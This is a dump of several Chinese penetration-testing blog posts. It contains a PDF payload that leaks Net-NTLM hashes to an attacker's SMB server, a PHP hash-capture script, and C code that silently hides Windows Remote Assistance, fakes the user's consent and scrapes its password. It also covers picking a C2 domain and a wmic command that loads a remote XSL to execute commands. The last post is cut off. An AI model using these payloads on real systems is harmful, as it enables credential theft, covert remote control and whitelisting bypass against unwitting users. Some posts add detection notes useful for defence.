<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[渗透技巧——利用PDF文件获取Net-NTLM hash]]></title>
    <url>%2Fposts%2F9906b85f.html</url>
    <content type="text"><![CDATA[0x00 前言 今年4月，来自CheckPoint的Assaf Baharav公开了一个方法，利用PDF文件的正常功能够窃取Windows系统的NTLM Hash。 具体的说，当用户使用PDF阅读器打开一份恶意的PDF文档，该PDF会向远程SMB服务器发出请求，如果该远程SMB服务器对数据包进行抓取，就能够获得用户Windows系统的Net NTLM Hash，通过进一步破解就有可能获得用户系统的明文密码。 然而Microsoft、Adobe和FoxIT对此没有进行针对性的修复。 这个利用方法成功的条件有哪些？没有修复的原因又是什么呢？ 本文将要站在技术研究的角度进行介绍 0x01 简介 本文将要介绍以下内容： 原理和利用思路 测试POC，生成一个恶意PDF文件 分析PDF文件格式 编写脚本实现修改正常PDF文件 开源代码 0x02 原理和利用思路 参考资料： https://research.checkpoint.com/ntlm-credentials-theft-via-pdf-files/ 原理PDF规范允许为GoTobe和GoToR条目加载远程内容 直观的理解： PDF文件可以添加一项功能，请求远程SMB服务器的文件 而我们知道，Windows系统下SMB协议有一个特性：客户端在连接SMB服务器时，默认先使用本机的用户名和密码hash尝试登录，通信协议默认为Net-NTLMv1或者Net-NTLMv2 工具Hashcat提供了字典和暴力破解两种方法来还原Net-NTLMv1和Net-NTLMv2协议中的明文密码 只要在SMB服务器上进行抓包，提取关键数据，就能够获得Hashcat需要的参数，尝试破解 抓包可选择WireShark，对获得的pcap包进行解析，提取关键数据。如果使用Responder可自动提取出关键数据。 之前写过的相关文章： 《Windows下的密码hash——NTLM hash和Net-NTLM hash介绍》 《渗透技巧——利用netsh抓取连接文件服务器的NTLMv2 Hash》 《渗透技巧——利用图标文件获取连接文件服务器的NTLMv2 Hash》 《Windows下的密码hash——Net-NTLMv1介绍》 类似的利用思路： 可参考以下文章： https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes/ 介绍了多种文件格式的利用方法 利用思路 构造一份特殊的PDF文档，请求SMB服务器的一份文件 在SMB服务器上抓包 用户使用PDF阅读器打开PDF文档时，Windows系统将当前用户的Net NTLM Hash发送到SMB服务器 SMB服务器提取出Net NTLM Hash，使用Hashcat进行破解 还原出用户的明文密码 根据用户的明文密码尝试进一步利用 0x03 测试POC Assaf Baharav在他的文章中已经公开了POC，如下图 注： 图片引用自https://research.checkpoint.com/ntlm-credentials-theft-via-pdf-files/ 如果想要直接进行测试，可参考Deepu TV的POC，地址如下： https://github.com/deepzec/Bad-Pdf 实际测试Client: IP: 192.168.62.135 OS: Win7 x86 SMB Server： IP: 192.168.62.139 OS: Win8 x86 开放共享文件夹: test 1、使用Bad-Pdf生成PDF文件本次测试对Bad-Pdf.py做部分修改，不执行Responder 设置host IP: 192.168.62.139 协议选择SMB 如下图 生成测试PDF文件badpdf.pdf 2、SMBServer进行抓包开启Wireshark 3、Clinet使用Adobe Reader打开badpdf.pdf4、查看Wireshark，成功获得Net NTLM Hash的数据包如下图 0x04 POC细节分析 参考代码： https://github.com/deepzec/Bad-Pdf/blob/master/badpdf.py Assaf Baharav的POC是在脚本中写好了PDF文件的模板 下面对其中的关键代码进行说明： (1) 2 0 obj &lt;&lt;/Type/Pages/Kids[3 0 R]/Count 1&gt;&gt; endobj /Type /Pages表示对象的类型为页码 /Kids[3 0 R]表示页的对象是3 /Count 1表示页码数量为1 (2) 3 0 obj &lt;&lt;/Type/Page/Parent 2 0 R/MediaBox[0 0 612 792]/Resources&lt;&lt;&gt;&gt;&gt;&gt; endobj /Parent 2 0 R表示父对象是2，同(1)中/Kids[3对应 /MediaBox表示页面的显示大小（以象素为单位） (3) xref 0 4 0000000000 65535 f 0000000015 00000 n 0000000060 00000 n 0000000111 00000 n xref表示这部分为交叉引用表 0 4表示下面各行所描述的对象号是从0开始，并且有4个对象 0000000000 65535 f固定格式，可看作文件头 0000000015 00000 n对应第一个对象，0000000015表示偏移地址(十进制);00000为5位产生号（最大为65535），0表明该对象未被修改过; n表示该对象在使用，如果为f，表示该对象为free (4) trailer &lt;&lt;/Size 4/Root 1 0 R&gt;&gt; startxref 190 ...中间省略的代码... trailer &lt;&lt; /Root 1 0 R &gt;&gt; %%EOF trailer表示文件尾trailer对象的开始 /Size 4表示该PDF文件的对象数目为4 /Root 1 0 R表示根对象的对象号为1 startxref 190表示交叉引用表的偏移地址为190 %%EOF表示文件结束标志 (5) 3 0 obj &lt;&lt; /Type /Page /Contents 4 0 R /AA &lt;&lt; /O &lt;&lt; /F (&#39;&#39;&#39; + host + &#39;&#39;&#39;test) /D [ 0 /Fit] /S /GoToE &gt;&gt; &gt;&gt; /Parent 2 0 R /Resources &lt;&lt; /Font &lt;&lt; /F1 &lt;&lt; /Type /Font /Subtype /Type1 /BaseFont /Helvetica &gt;&gt; &gt;&gt; &gt;&gt; &gt;&gt; endobj 此处为关键代码，实现远程访问 /Contents 4 0 R表示页面内容对象的对象号为4 /Parent 2 0 R表示父对象是2 在/Contents 4 0 R和/Parent 2 0 R直接为实现远程访问的代码 对于PDF文件格式，不需要换行符，所以这段代码去掉换行符和空格，填入ServerIP后为/AA &lt;&lt;/O &lt;&lt;/F (\\\\192.168.62.139\\test)/D [ 0 /Fit]/S /GoToE&gt;&gt;&gt;&gt; 0x05 修改正常PDF文件 接下来，尝试修改正常的文件，添加代码，实现远程访问功能 使用工具生成的PDF文件一般都很大，分析格式不是很方便，这里提供一个python生成PDF的参考代码，地址如下： http://code.activestate.com/recipes/189858/ 输入txt文件，输出pdf文件 实际测试1.txt的内容为： 1234567 cmd: recipe-189858-1.py 1.txt 生成的pdf文件1.txt.pdf，文件大小1213 bytes 查看1.txt.pdf的文件格式，如下图 在/Parent 3 0 R和/Resources 5 0 R直接添加代码/AA &lt;&lt;/O &lt;&lt;/F (\\\\192.168.62.139\\test)/D [ 0 /Fit]/S /GoToE&gt;&gt;&gt;&gt; 注: 需要十六进制编辑，使用文本编辑会导致PDF文件出错 对PDF文件添加上述代码后，交叉引用表中对象的偏移位置会出现偏差，需要重新计算，修正偏移位置 使用Adobe Reader打开修改后的文件1.txt.pdf，SMB服务器成功抓到Net NTLM Hash，修改成功 0x06 脚本编写 经实际测试，不修正交叉引用表中对象的偏移位置，不会影响PDF文件的正常访问 所以脚本编写上只需要定位/Parent &lt;n&gt; 0 R后，添加访问远程文件的代码即可 值得注意的是PDF文件的读取和写入需要以二进制格式 实现代码已开源，可参考： https://github.com/3gstudent/Worse-PDF 0x07 利用分析 成功利用需要满足以下条件： 用户使用PDF阅读器打开，如果使用IE或是Chrome打开PDF文件，并不会执行 对于Windows系统，通过Net NTLM Hash破解出明文有一定难度 即使破解出了明文，利用的效果也有限(例如普通用户的Windows系统很少开启远程登录功能) 0x08 防御 虽然微软并未针对这个利用方法进行针对性的修复，但在之前已经提供了一个防御的方法，参考地址： https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/ADV170014 但只支持Win10和Server2016 0x09 小结 本文测试了利用PDF文件获取Net-NTLM hash的方法，分析原理，根据PDF的文件格式尝试编写脚本实现修改正常的PDF文件，开源代码，总结利用条件。 最后，个人也认为Microsoft没有必要对此进行针对性的修复。 LEAVE A REPLY]]></content>
  </entry>
  <entry>
    <title><![CDATA[渗透技巧——利用PHP脚本从浏览器中获得Net-NTLM hash]]></title>
    <url>%2Fposts%2F4a33576b.html</url>
    <content type="text"><![CDATA[0x00 前言 在上篇文章《渗透技巧——通过HTTP协议获得Net-NTLM hash》介绍了通过HTTP协议获得客户端当前登录用户Net-NTLM hash的方法，侧重于介绍原理和思路，本文将要给出一个具体的实现方法，利用PHP脚本模拟Net-NTLM认证过程，提取出客户端的Net-NTLM hash 0x01 简介 本文将要介绍以下内容： Net-NTLM认证过程 利用PHP脚本模拟认证过程 脚本编写细节 实际测试 0x02 Net-NTLM认证过程 参考资料： https://www.innovation.ch/personal/ronald/ntlm.html 依然使用这幅图，如下图 注： 图片截取自https://www.innovation.ch/personal/ronald/ntlm.html 0x03 利用PHP脚本模拟认证过程 想要通过PHP脚本模拟Net-NTLM认证过程，主要考虑的是Server端的实现 1、发送WWW-Authenticate: NTLM接收Client的GET请求，回复401 Unauthorized WWW-Authenticate: NTLM，提示Client需要NTLM认证 2、发送WWW-Authenticate: NTLM &lt;base64-encoded type-2-message&gt;接收Client的Type-1-Message，回复Type-2-message The Type 2 Message的结构如下： Offset Description Content 0 NTLMSSP Signature Null-terminated ASCII “NTLMSSP” (0x4e544c4d53535000) 8 NTLM Message Type long (0x02000000) 12 Target Name security buffer 20 Flags long 24 Challenge 8 bytes (32) Context (optional) 8 bytes (two consecutive longs) (40) Target Information (optional) security buffer (48) OS Version Structure (Optional) 8 bytes 详细参数说明可参考： http://davenport.sourceforge.net/ntlm.html#theType2Message 值得注意的参数为Flags和Challenge Challenge是使用hashcat破解Net-NTLM hash的必须参数 Flags包含多种类型，一个简单的Flags示例，如下图 对应的数据格式如下图 3、解析Type-3-messageType-3-message包含Client加密后的Net-NTLM hash消息，提取出对应格式的数据可用于破解 Type-3-message示例如下图 这里需要注意每个参数的存储格式 short Length; short Maxlen; short Offset; Offset对应参数具体内容的偏移地址 4、发送网页内容Server向Client提供最终的请求内容 0x04 脚本编写细节 为了便于测试，不会对用户提交的凭据做验证，直接在HTTP的回复内容中返回用户的验证凭据 完整POC代码已开源，地址如下： https://raw.githubusercontent.com/3gstudent/Writeup/master/catchyournetntlm.php POC代码基于https://loune.net/2007/10/simple-lightweight-ntlm-in-php/ 做了以下优化： 1、不再局限于apache module原脚本只能在apache下使用 2、提取Net-NTLM hash原脚本输出Client的三个属性： $user $domain $workstation 新脚本添加了文件格式解析的功能，提取出HMAC-MD5和blob 脚本细节： 原POC中的function get_msg_str($msg, $start, $unicode = true) 在调用$user = get_msg_str($msg, 36);时，由于之前的Flags指定了unicode，所以默认执行以下代码： if ($unicode) return str_replace(&quot;\0&quot;, &#39;&#39;, substr($msg, $off, $len)); 会自动去除字符串中的0x00 而在提取HMAC-MD5和blob时，需要保留0x00，所以我们要传入参数false，不对字符0x00进行过滤 具体的代码为： $Response = get_msg_str($msg, 20,false); 至于challenge，在脚本中指定为0x0000000000000000，所以最后拼接hashcat的格式时直接设置为0x0000000000000000即可 0x05 实际测试 1、本地测试Server： 安装apache环境 简单的配置方法: 安装phpstudy 上传脚本catchyournetntlm.php Client： 修改IE配置文件，将登录方式修改为Automatic logon with current user name and password 对应命令如下： REG ADD &quot;HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Internet Settings\Zones\3&quot; /v 1A00 /t REG_DWORD /d 00000000 /f 注： 域环境下不需要这个设置 Client访问服务器上的catchyournetntlm.php，服务器获得用户的Net-NTLM hash，提取出固定格式返回至Client Client显示如下图 数据可直接用于hashcat的破解 2、在线测试https://evi1cg.me/test.php 服务器使用nginx，未使用apache 注： nginx下脚本的优化由evilcg完成 Client使用默认登录方法，访问该网址弹出对话框提示输入密码，如下图 任意输入，获得输入内容的Net-NTLM hash，如下图 将Client的登录方式修改为Automatic logon with current user name and password，访问该网址自动获得Client当前用户的Net-NTLM hash，如下图 0x06 小结 本文介绍了利用PHP脚本从浏览器中获得Net-NTLM hash的方法，分享脚本编写细节，实际测试该方法的效果。 LEAVE A REPLY]]></content>
  </entry>
  <entry>
    <title><![CDATA[渗透技巧——Windows远程协助的隐蔽执行]]></title>
    <url>%2Fposts%2Fa450765a.html</url>
    <content type="text"><![CDATA[0x00 前言 对于Windows系统，经常会用到远程桌面服务，通过界面对系统进行远程管理。 这其中存在一个不足：使用远程桌面服务进行远程登录(使用另一用户或是踢掉当前用户)，无法获取到当前用户的系统状态。 如果想要查看(甚至是操作)当前用户的桌面，有什么好办法呢？ 虽然我们可以通过编写程序来实现界面操作（捕获桌面信息，压缩传输，发送鼠标键盘消息等），但是如果能够使用Windows系统的默认功能，岂不是更好？ 答案就是Windows系统的远程协助。 0x01 简介 本文将要介绍以下内容： 远程协助的基本操作 命令行下操作 编写c++程序隐藏界面，发送键盘消息，模拟用户点击确认 完整利用流程 检测方法 0x02 远程协助的基本操作 1、开启远程协助功能System Properties -&gt; Remote 选中Allow Remote Assistance connections to this computer 如下图 2、添加防火墙规则，允许远程协助的通信端口Windows Firewall -&gt; Allowed Programs 选中Remote Assistance 如下图 3、启动界面程序运行 -&gt; msra.exe 4、配置本机为服务端，请求其他人协助选中Invite someone you trust to help you 如下图 选中Save this invitation as a file 如下图 保存为文件Invitation.msrcincident 自动弹出界面，生成一个随机密码，记录该密码，如下图 5、控制端发起远程连接控制端运行文件Invitation.msrcincident，填入上一步生成的密码，发起远程连接 6、服务端确认连接请求服务端弹框，需要用户确认，允许远程协助，如下图 选择Yes，远程协助成功建立 0x03 命令行下操作 1、开启系统远程协助修改注册表项HKLM\SYSTEM\CurrentControlSet\Control\Remote Assistance下的键值fAllowToGetHelp，1代表允许，0代表禁止 REG ADD &quot;HKLM\SYSTEM\CurrentControlSet\Control\Remote Assistance&quot; /v fAllowToGetHelp /t REG_DWORD /d 1 /f 2、配置防火墙规则，允许远程协助的通信端口netsh advfirewall firewall set rule group=&quot;Remote Assistance&quot; new enable=Yes 3、创建远程协助文件，后台等待用户连接msra /saveasfile c:\test\1.msrcIncident 123456789012 保存文件路径为c:\test\1.msrcIncident，连接密码为123456789012 0x04 编写c程序隐藏界面，发送键盘消息，模拟用户点击确认 1、隐藏msra.exe的界面获得窗口句柄，将窗口属性设置为隐藏 需要注意不同语言的系统中msra.exe的窗口标题不同，例如中文系统的窗口标题为Windows 远程协助，英文系统的窗口标题为Windows Remote Assistance 可以先对当前系统语言作判断，接着寻找对应的窗口标题 为了使界面完全隐藏，需要加入循环判断，只要找到msra.exe的窗口立即对其隐藏 可供参考的代码如下： #include &lt;windows.h&gt; int main() { char *Title = NULL; LANGID lid = GetSystemDefaultLangID(); printf(&quot;[*]LanguageID:0x%04x\n&quot;,lid); switch (lid) { case 0X0804: printf(&quot;[*]Language:Chinese\n&quot;,lid); Title = &quot;Windows 远程协助&quot;; break; case 0x0409: printf(&quot;[*]Language:Englisth\n&quot;,lid); Title = &quot;Windows Remote Assistance&quot;; break; } for(int i=0;i&lt;1;i) { HWND hwnd = FindWindow(NULL, Title); ShowWindow(hwnd, SW_HIDE); Sleep(100); } } 编译生成msra-hide.exe 2、模拟输入键盘消息，左箭头(&lt;-)和回车确认键正常情况下，控制端成功输入密码后，服务端会弹框提示用户是否允许远程协助 这里通过程序实现模拟用户输入，选中Yes，对应的键盘操作为左箭头(&lt;-)和回车确认键 代码如下： #include &lt;windows.h&gt; int main() { char *Title = NULL; LANGID lid = GetSystemDefaultLangID(); printf(&quot;[*]LanguageID:0x%04x\n&quot;,lid); switch (lid) { case 0X0804: printf(&quot;[*]Language:Chinese\n&quot;,lid); Title = &quot;Windows 远程协助&quot;; break; case 0x0409: printf(&quot;[*]Language:Englisth\n&quot;,lid); Title = &quot;Windows Remote Assistance&quot;; break; } HWND hwnd = FindWindow(NULL, Title); SetActiveWindow(hwnd); SetForegroundWindow(hwnd); SetFocus(hwnd); keybd_event(37,0,0,0); keybd_event(37,0,KEYEVENTF_KEYUP,0); keybd_event(13,0,0,0); keybd_event(13,0,KEYEVENTF_KEYUP,0); } 编译生成msra-allow.exe 3、扩展：获得远程协助窗口的连接密码通过枚举子窗口获得连接密码 使用API FindWindow获得窗口句柄 使用API EnumChildWindows遍历窗口所有子窗口，获得密码内容 API EnumChildWindows会自动枚举，直至获得最后一个子窗口或者函数返回0 实际测试发现第二个子窗口保存密码，所以在获得密码后函数返回0提前结束枚举 代码如下： #include &lt;windows.h&gt; int status = 0; BOOL CALLBACK EnumMainWindow(HWND hwnd, LPARAM lParam) { const int BufferSize = 1024; char BufferContent[BufferSize] = &quot;&quot;; SendMessage(hwnd, WM_GETTEXT, (WPARAM)BufferSize, (LPARAM)BufferContent); status++; if (status == 2) { printf(&quot;[+]Find Password\n&quot;); printf(&quot;%s\n&quot;, BufferContent); return 0; } return 1; } int main() { char *Title = NULL; LANGID lid = GetSystemDefaultLangID(); printf(&quot;[*]LanguageID:0x%04x\n&quot;,lid); switch (lid) { case 0X0804: printf(&quot;[*]Language:Chinese\n&quot;,lid); Title = &quot;Windows 远程协助&quot;; break; case 0x0409: printf(&quot;[*]Language:Englisth\n&quot;,lid); Title = &quot;Windows Remote Assistance&quot;; break; } HWND hwnd = FindWindow(NULL, Title); if(hwnd) { printf(&quot;[+]Find Window\n&quot;); EnumChildWindows(hwnd, EnumMainWindow, 0); } else { printf(&quot;[!]No Window\n&quot;); } } 测试如下图 0x05 完整利用流程 1、开启远程协助REG ADD &quot;HKLM\SYSTEM\CurrentControlSet\Control\Remote Assistance&quot; /v fAllowToGetHelp /t REG_DWORD /d 1 /f netsh advfirewall firewall set rule group=&quot;Remote Assistance&quot; new enable=Yes 2、运行拦截程序msra-hide.exe，隐藏msra窗口需要管理员权限 3、生成远程协助邀请文件msra /saveasfile c:\test\1.msrcIncident 123456789012 4、控制端进行连接获得文件1.msrcIncident并执行，输入连接密码 5、运行模拟键盘输入程序msra-allow.exe，允许远程协助需要管理员权限 6、控制端获得远程协助的桌面如下图 7、控制端请求获得服务端的鼠标操作权限在控制界面选择请求控制 8、再次运行模拟键盘输入程序msra-allow.exe，允许鼠标操作需要管理员权限 控制端成功获得控制服务端鼠标 至此，成功获得目标系统的桌面操作权限 9、清除连接记录远程协助的记录保存位置：%SystemDrive%\Users\user_name\Documents\Remote Assistance Logs 命名规则: YYYYMMDDHHMMSS.xml (24小时时间格式) 日志文件内保存连接时间 0x06 检测方法 本文介绍的方法前提是已经取得了系统的管理员权限，代表该系统已经被攻破 结合利用思路，可以通过以下方法检测： 注册表HKLM\SYSTEM\CurrentControlSet\Control\Remote Assistance键值被修改 防火墙规则被修改 启动进程msra.exe 生成新文件夹%SystemDrive%\Users\user_name\Documents\Remote Assistance Logs 开放的异常端口 0x07 小结 本文对Windows远程协助的功能进行了介绍，编写程序实现Windows远程协助的隐蔽执行，结合利用思路给出检测方法 LEAVE A REPLY]]></content>
  </entry>
  <entry>
    <title><![CDATA[渗透基础——选择一个合适的C2域名]]></title>
    <url>%2Fposts%2F505d2022.html</url>
    <content type="text"><![CDATA[0x00 前言 在渗透测试中，常常需要选择一个合适的域名作为c2服务器，那么什么样的域名才能称之为”合适”呢？ expireddomains.net也许能够给你一些思路。 通过expireddomains.net能够查询到最近过期或删除的域名，更重要的是它提供了关键词搜索功能。 本文将要测试过期域名自动化搜索工具CatMyFish，分析原理，修正其中的bug，使用python编写一个爬虫，获得所有搜索结果。 0x01 简介 本文将要介绍以下内容： 测试过期域名自动化搜索工具CatMyFish 分析原理修正CatMyFish中的bug 爬虫开发思路和实现细节 开源python实现的爬虫代码 0x02 测试过期域名自动化搜索工具CatMyFish 下载地址： https://github.com/Mr-Un1k0d3r/CatMyFish 主要实现流程 用户输入关键词 脚本将搜索请求发送到expireddomains.net进行查询 获得域名列表 脚本将域名发送到Symantec BlueCoat进行查询 获取每个域名的类别 expireddomains.net地址： https://www.expireddomains.net/ Symantec BlueCoat地址: https://sitereview.bluecoat.com/ 实际测试需要安装python库beautifulsoup4 pip install beautifulsoup4 尝试搜索关键词microsoft，脚本报错，如下图 脚本对结果的解析出现了问题 于是，按照CatMyFish的实现思路自己编写脚本测试一下 访问expireddomains.net查询关键词microsoft，代码如下: import urllib import urllib2 from bs4 import BeautifulSoup url = &quot;https://www.expireddomains.net/domain-name-search/?q=microsoft&quot; req = urllib2.Request(url) res_data = urllib2.urlopen(req) html = BeautifulSoup(res_data.read(), &quot;html.parser&quot;) tds = html.findAll(&quot;td&quot;, {&quot;class&quot;: &quot;field_domain&quot;}) for td in tds: for a in td.findAll(&quot;a&quot;, {&quot;class&quot;: &quot;namelinks&quot;}): print a.text 共获得15个结果，如下图 通过浏览器访问，共获得25个结果，如下图 经过对比发现通过脚本获得的数目相比浏览器要少，应该是脚本在筛选的时候出现了问题 注： 初学者建议掌握一下beautifulsoup4的基本使用技巧，本文暂略 0x03 查找bug原因 1、根据response查看域名标签，对筛选规则进行判断需要获取到接收到的response数据，通过查看各个域名对应的标签，判断是否在标签筛选的时候出现了问题 查看response数据的两种方法： (1) 使用Chrome浏览器查看F12 -&gt; More tools -&gt; Network conditions 重新加载网页,选择?q=microsoft -&gt; Resonse 如下图 (2) 使用python脚本代码如下： import urllib import urllib2 url = &quot;https://www.expireddomains.net/domain-name-search/?q=microsoft&quot; req = urllib2.Request(url) res_data = urllib2.urlopen(req) print res_data.read() 分析response数据,发现出错原因: 使用原测试脚本能够提取出如下数据中的域名: &lt;td class=&quot;field_domain&quot;&gt;&lt;a class=&quot;namelinks&quot; href=&quot;/goto/1/71h90s/59/?tr=search&quot; id=&quot;linksdd-domain71h90s&quot; rel=&quot;nofollow&quot; target=&quot;_blank&quot; title=&quot;MicroSoft.msk.ru&quot;&gt;&lt;strong&gt;MicroSoft&lt;/strong&gt;.msk.ru&lt;/a&gt;&lt;ul class=&quot;kmenucontent&quot; id=&quot;links-domain71h90s&quot; style=&quot;display:none;&quot;&gt;&lt;li class=&quot;first&quot;&gt;&lt;a class=&quot;favicons favgodaddy&quot; href=&quot;/goto/16/75wxyx/59/?tr=search&quot; rel=&quot;nofollow&quot; target=&quot;_blank&quot; title=&quot;Register at GoDaddy.com&quot;&gt;GoDaddy.com&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a class=&quot;favicons favdynadot&quot; href=&quot;/goto/53/740s95/59/?tr=search&quot; rel=&quot;nofollow&quot; target=&quot;_blank&quot; title=&quot;Register at Dynadot.com&quot;&gt;Dynadot.com&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a class=&quot;favicons favuniregistry&quot; href=&quot;/goto/66/7252us/59/?tr=search&quot; rel=&quot;nofollow&quot; target=&quot;_blank&quot; title=&quot;Register at Uniregistry.com&quot;&gt;Uniregistry.com&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a class=&quot;favicons favnamecheap&quot; href=&quot;/goto/43/7459ux/59/?tr=search&quot; rel=&quot;nofollow&quot; target=&quot;_blank&quot; title=&quot;Register at Namecheap.com&quot;&gt;Namecheap.com&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a class=&quot;favicons favonecom&quot; href=&quot;/goto/57/71gmkr/59/?tr=search&quot; rel=&quot;nofollow&quot; target=&quot;_blank&quot; title=&quot;Register at One.com&quot;&gt;One.com&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a class=&quot;favicons fav123reg&quot; href=&quot;/goto/48/7254ap/59/?tr=search&quot; rel=&quot;nofollow&quot; target=&quot;_blank&quot; title=&quot;Register at 123-reg.co.uk&quot;&gt;123-reg.co.uk&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;/td&gt; 但是response数据中还包含另一种类型的数据: &lt;td class=&quot;field_domain&quot;&gt;&lt;a href=&quot;/goto/1/4o47ng/39/?tr=search&quot; rel=&quot;nofollow&quot; target=&quot;_blank&quot; title=&quot;NewMicroSoft.com&quot;&gt;New&lt;strong&gt;MicroSoft&lt;/strong&gt;.com&lt;/a&gt;&lt;/td&gt; 原测试脚本没有提取该标签中保存的域名信息 0x04 bug修复 筛选思路： 获得标签&lt;td class=&quot;field_domain&quot;&gt;中第一个title的内容 原因： 这样能同时获得两组数据中保存的域名信息，过滤无效信息(如第二个title中的域名GoDaddy.com) 实现代码: tds = html.findAll(&quot;td&quot;, {&quot;class&quot;: &quot;field_domain&quot;}) for td in tds: print td.findAll(&quot;a&quot;)[0][&quot;title&quot;] 因此,获得完整查询结果的测试代码如下: import urllib import urllib2 import sys from bs4 import BeautifulSoup def SearchExpireddomains(key): url = &quot;https://www.expireddomains.net/domain-name-search/?q=&quot; + key req = urllib2.Request(url) res_data = urllib2.urlopen(req) html = BeautifulSoup(res_data.read(), &quot;html.parser&quot;) tds = html.findAll(&quot;td&quot;, {&quot;class&quot;: &quot;field_domain&quot;}) for td in tds: print td.findAll(&quot;a&quot;)[0][&quot;title&quot;] if __name__ == &quot;__main__&quot;: SearchExpireddomains(sys.argv[1]) 成功获得第一页的所有结果，测试如下图 0x05 获得所有查询结果 expireddomains.net每页保存25个结果，想要获得所有结果，需要发送多个请求，遍历所有查询页面的结果 首先需要获得所有结果的数目，除以25获得需要查询的页面个数 1、统计所有结果查看Response，找到表示搜索结果数目的位置，内容如下： &lt;div class=&quot;pagescode page_top&quot;&gt; &lt;div class=&quot;addoptions left&quot;&gt; &lt;span class=&quot;showfilter&quot;&gt;Show Filter&lt;/span&gt; &lt;span&gt;(About &lt;strong&gt;20,213 &lt;/strong&gt; Domains)&lt;/span&gt; Chrome浏览器显示如下图 为了简化代码长度，使用select()直接传入CSS选择器进行筛选，在对标签strong进行筛选后，第1个标签表示结果数目，对应查询代码为： print html.select(&#39;strong&#39;)[0] 输出结果为&lt;strong&gt;20,213 &lt;/strong&gt; 提取其中的数字： print html.select(&#39;strong&#39;)[0].text 输出结果为20,213 去掉中间的”,”： print html.select(&#39;strong&#39;)[0].text.replace(&#39;,&#39;, &#39;&#39;) 输出结果为20213 除以25即可获得需要查询的页面个数，这里需要注意需要将字符串类型的”20213”转换为整型20213 2、猜测查询规律第二页查询的url: https://www.expireddomains.net/domain-name-search/?start=25&amp;q=microsoft 第三页查询的url: https://www.expireddomains.net/domain-name-search/?start=50&amp;q=microsoft 找到查询规律，第i页查询的url： https://www.expireddomains.net/domain-name-search/?start=&lt;25*(i-1)）&gt;&amp;q=microsoft 注： 经测试，expireddomains.net对未登录用户最多提供550个的结果，共21页 3、对结果进行判断在脚本实现上，需要对结果进行判断，如果结果大于550，只输出21页，如果小于550，输出&lt;结果/25&gt;页 4、模拟浏览器访问(备选)当我们使用脚本尝试自动查询多个页面时，如果网站使用了反爬虫机制，无法获得真实数据 经测试，expireddomains.net并未开启反爬虫机制 如果在将来，expireddomains.net开启了反爬虫机制，脚本需要模拟浏览器发送请求，在头部附加User-Agent等信息 查看Chrome浏览器获得发送请求的信息，如下图 对照请求，添加头部信息即可绕过 示例代码： req.add_header(&quot;User-Agent&quot;, &quot;Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36&quot;) 完整代码实现地址： https://github.com/3gstudent/GetExpiredDomains 实际测试： 搜索关键词microsoftoffices，结果少于550，如下图 搜索关键词microsoft，结果大于550，只显示21页，如图 同Web访问的内容对比，结果相同，测试成功 0x06 小结 本文测试了过期域名自动化搜索工具CatMyFish，分析原理，修正其中的bug，使用python编写爬虫获得所有搜集结果，分享开发思路，开源代码。 LEAVE A REPLY]]></content>
  </entry>
  <entry>
    <title><![CDATA[利用wmic调用xsl文件的分析与利用]]></title>
    <url>%2Fposts%2Fd2d3d726.html</url>
    <content type="text"><![CDATA[0x00 前言 Casey Smith@subTee在博客分享的一个技巧，使用wmic能够从本地或从URL调用XSL（可扩展样式表语言）脚本。这个发现很有用，不仅可以作为一种白名单绕过的方法，而且可以作为payload来使用(从URL调用XSL脚本，利用XSL执行exe、shellcode、powershell脚本)。 本文将要对该项技术进行测试，结合自己的经验对其扩展，分享一个后门利用的思路，介绍同XXE漏洞结合的使用方法。 博客地址： https://subt0x11.blogspot.ca/2018/04/wmicexe-whitelisting-bypass-hacking.html?m=1 0x01 简介 本文将要介绍以下内容： 测试Casey Smith的方法 脚本分析，分析后门利用思路 编写后门利用脚本 同XXE漏洞的结合 0x02 测试Casey Smith的方法 本地： wmic process list /FORMAT:evil.xsl 远程： wmic os get /FORMAT:&quot;https://example.com/evil.xsl&quot; xsl文件内容如下： &lt;?xml version=&#39;1.0&#39;?&gt; &lt;stylesheet xmlns=&quot;http://www.w3.org/1999/XSL/Transform&quot; xmlns:ms=&quot;urn:schemas-microsoft-com:xslt&quot; xmlns:user=&quot;placeholder&quot; version=&quot;1.0&quot;&gt; &lt;output method=&quot;text&quot;/&gt; &lt;ms:script implements-prefix=&quot;user&quot; language=&quot;JScript&quot;&gt; &lt;![CDATA[ var r = new ActiveXObject(&quot;WScript.Shell&quot;).Run(&quot;cmd.exe&quot;); ]]&gt; &lt;/ms:script&gt; &lt;/stylesheet&gt; 注： 代码来源于https://gist.githubusercontent.com/caseysmithrc/68924cabbeca1285d2941298a5b91c24/raw/8574e0c019b17d84028833220ed0b30cf9eea84b/minimalist.xsl 0x03 脚本分析 查看xsl文件格式，发现类似于之前研究过的利用脚本(使用msxsl.exe执行xsl脚本，也是学习自Casey Smith)，内容如下： &lt;?xml version=&#39;1.0&#39;?&gt; &lt;xsl:stylesheet version=&quot;1.0&quot; xmlns:xsl=&quot;http://www.w3.org/1999/XSL/Transform&quot; xmlns:msxsl=&quot;urn:schemas-microsoft-com:xslt&quot; xmlns:user=&quot;http://mycompany.com/mynamespace&quot;&gt; &lt;msxsl:script language=&quot;JScript&quot; implements-prefix=&quot;user&quot;&gt; function xml(nodelist) { var r = new ActiveXObject(&quot;WScript.Shell&quot;).Run(&quot;calc.exe&quot;); return nodelist.nextNode().xml; } &lt;/msxsl:script&gt; &lt;xsl:template match=&quot;/&quot;&gt; &lt;xsl:value-of select=&quot;user:xml(.)&quot;/&gt; &lt;/xsl:template&gt; &lt;/xsl:stylesheet&gt; 注： 代码来源于https://gist.github.com/subTee/47f16d60efc9f7cfefd62fb7a712ec8d 我对该技术的分析文章链接： https://3gstudent.github.io/3gstudent.github.io/Use-msxsl-to-bypass-AppLocker/ 经测试，文章《Use msxsl to bypass AppLocker》中使用的xsl脚本和xml脚本wmic均支持，只是对后缀名有要求(必须是xsl文件) 实际测试：执行： wmic os get 